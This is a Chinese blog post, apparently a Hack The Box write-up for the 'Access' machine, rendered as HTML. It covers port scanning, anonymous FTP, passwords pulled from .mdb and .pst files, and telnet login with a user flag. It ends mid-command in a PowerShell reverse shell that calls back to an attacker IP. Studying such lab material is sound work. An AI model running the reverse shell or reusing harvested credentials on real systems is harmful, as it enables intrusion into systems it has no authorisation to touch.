@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：FTP匿名访问、.mdb文件查看、.pst文件查看、telnet服务账号登录、powershell反弹shell、管理员密码策略枚举、runas用户切换">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Access-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/22/Access-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：FTP匿名访问、.mdb文件查看、.pst文件查看、telnet服务账号登录、powershell反弹shell、管理员密码策略枚举、runas用户切换">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Access-htb-writeup/10.png">
+<meta property="article:published_time" content="2024-05-22T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-23T09:21:26.579Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Access-htb-writeup/1.png">
+  
+  
+  
+  <title>Access-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Access-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-22 23:50" pubdate>
+          2024年5月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Access-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：FTP匿名访问、.mdb文件查看、.pst文件查看、telnet服务账号登录、powershell反弹shell、管理员密码策略枚举、runas用户切换</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.jgeek.cn/article/69</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.98</p>
+<p>2、获取下靶机开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>      <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-21 22:27 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span><br>Host is up (<span class="hljs-number">0.48</span>s latency).<br>Not shown: <span class="hljs-number">65532</span> filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br><span class="hljs-number">23</span>/tcp open  telnet<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16.17</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p21,<span class="hljs-number">23</span>,<span class="hljs-number">80</span> -sC -sV --min-rate=<span class="hljs-number">1000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>                                                          <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-21 22:42 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span><br>Host is up (<span class="hljs-number">1.5</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp open  ftp     Microsoft ftpd<br>| ftp-syst: <br>|_  SYST: Windows_NT<br>| ftp-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|_Can<span class="hljs-number">&#x27;</span>t get directory listing: TIMEOUT<br><span class="hljs-number">23</span>/tcp open  telnet  Microsoft Windows XP telnetd<br>| telnet-ntlm-info: <br>|   Target_Name: ACCESS<br>|   NetBIOS_Domain_Name: ACCESS<br>|   NetBIOS_Computer_Name: ACCESS<br>|   DNS_Domain_Name: ACCESS<br>|   DNS_Computer_Name: ACCESS<br>|_  Product_Version: <span class="hljs-number">6.1</span><span class="hljs-number">.7600</span><br><span class="hljs-number">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">7.5</span><br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">7.5</span><br>|_http-title: MegaCorp<br>Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp<br><br>Host script results:<br>|_clock-skew: <span class="hljs-number">-8</span>h03m35s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">56.38</span> seconds<br>                                                <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports1 <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span> -sU<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-21 22:44 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span><br>Host is up (<span class="hljs-number">0.63</span>s latency).<br>All <span class="hljs-number">65535</span> scanned ports on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span> are in ignored states.<br>Not shown: <span class="hljs-number">65535</span> open|filtered udp ports (no-response)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">21.60</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、开放的端口还是比较少的，这里有一个大坑，不知道上一个打这个靶机的是谁，把FTP给搞挂了，导致我一直找不到入口点，服了。。。我都开始怀疑是不是我太菜了，一个easy靶机，我已经打了100多台了，我还找不见入口点？？？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ftp anonymous@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span> <br>Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>.<br><span class="hljs-number">220</span> Microsoft FTP Service<br><span class="hljs-number">331</span> Anonymous access allowed, send <span class="hljs-title function_">identity</span> <span class="hljs-params">(e-mail name)</span> as password.<br>Password: <br>230 User logged in.<br>Remote system type is Windows_NT.<br>ftp&gt; ls<br>229 Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49158</span>|)</span><br>ftp: Can&#x27;t connect to `10.10.10.98:49158&#x27;: 连接超时<br>421 Service not available, remote server has closed connection.<br>229 Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49158</span>|)</span><br>ftp&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>4、这里重置了下靶机，才恢复正常了，80端口是也网页，什么信息都没有只是一个摄像头视角的照片</p>
+<p><code>http://10.10.10.98/</code></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、FTP可以匿名登录，这里通过图形界面，先把文件都拷贝下来</p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、这里我尝试使用john和hashcat去破解压缩包密码，可能确实比较复杂最后没破解出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ zip2john Access\ Control.zip &gt; zip.hash<br></code></pre></td></tr></table></figure>
+
+<p>7、不过通过查看.mdb文件发现了一些账号密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">admin<br>engineer<br>backup_admin<br><br>admin<br>access4u@security<br>admin<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">John<br>Mark<br>Sunita<br>Mary<br>Monica<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、这里使用这个密码，把上面的压缩包给解压了 <code>access4u@security</code></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、Access Control.pst 这个文件，应该是Outlook数据库文件，看来需要翻邮件了，由于我不想直接用我的outlook加载，我就用下面这个工具，暂时恢复了看看了。<code>BitRecover PST Viewer</code></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Access-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、还是发现了好多信息的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">8</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span> <span class="hljs-number">7</span>:<span class="hljs-number">44</span>:<span class="hljs-number">00</span> AM	<br><br><br>MegaCorp Access Control System <span class="hljs-string">&quot;security&quot;</span> account	<br><br><br>Hi there,<br><br>The password <span class="hljs-keyword">for</span> the “security” account has been changed to <span class="hljs-number">4</span>Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.<br><br>Regards,<br><br>John<br><br>john@megacorp.com	<br><br><span class="hljs-string">&#x27;security@accesscontrolsystems.com&#x27;</span>	 <br></code></pre></td></tr></table></figure>
+
+<p>11、通过邮件可以知道默认的账号密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">security<br><br><span class="hljs-number">4</span>Cc3ssC0ntr0ller<br></code></pre></td></tr></table></figure>
+
+<p>12、经过尝试，果然是这个用户的账号密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ telnet <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span><br>Trying <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>...<br>Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>Welcome to Microsoft Telnet Service <br><br>login: security<br>password: <br><br>*===============================================================<br>Microsoft Telnet Server.<br>*===============================================================<br>C:\Users\security&gt;whoami<br>access\security<br><br>C:\Users\security&gt;dir-<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">8164</span>-DB5F<br><br> Directory of C:\Users\security<br><br><span class="hljs-number">08</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">52</span> PM    &lt;DIR&gt;          .<br><span class="hljs-number">08</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">52</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-number">08</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">37</span> PM    &lt;DIR&gt;          .yawcam<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Contacts<br><span class="hljs-number">08</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">51</span> AM    &lt;DIR&gt;          Desktop<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Documents<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Downloads<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Favorites<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Links<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Music<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Pictures<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Saved Games<br><span class="hljs-number">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          Searches<br><span class="hljs-number">08</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">39</span> PM    &lt;DIR&gt;          Videos<br>               <span class="hljs-number">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>              <span class="hljs-number">14</span> Dir(s)   <span class="hljs-number">3</span>,<span class="hljs-number">347</span>,<span class="hljs-number">705</span>,<span class="hljs-number">856</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\security&gt;<br></code></pre></td></tr></table></figure>
+
+<p>13、呢就获取下初始的flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\security&gt;cd Desktop<br><br>C:\Users\security\Desktop&gt;dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">8164</span>-DB5F<br><br> Directory of C:\Users\security\Desktop<br><br><span class="hljs-number">08</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">51</span> AM    &lt;DIR&gt;          .<br><span class="hljs-number">08</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">51</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-number">05</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">40</span> AM                <span class="hljs-number">34</span> user.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">3</span>,<span class="hljs-number">347</span>,<span class="hljs-number">705</span>,<span class="hljs-number">856</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\security\Desktop&gt;type user.txt<br><span class="hljs-number">2</span>d8ccaf31bd74d0846f4a0ce8affd102<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>14、由于靶机的初始权限是通过Telnet进行访问的，回显比较慢，我这里构造一个powershell的反弹shell，来稳固下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\security\Desktop&gt;powershell -nop -W hidden -noni -ep bypass -c <span class="hljs-string">&quot;$TCPClient = New-Object Net.Sockets.TCPClient(&#x27;10.10.14.45&#x27;, 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % &#123;0&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;WriteToStream &#x27;&#x27;;while(($BytesRead = $NetworkStream.Read($Buffer, 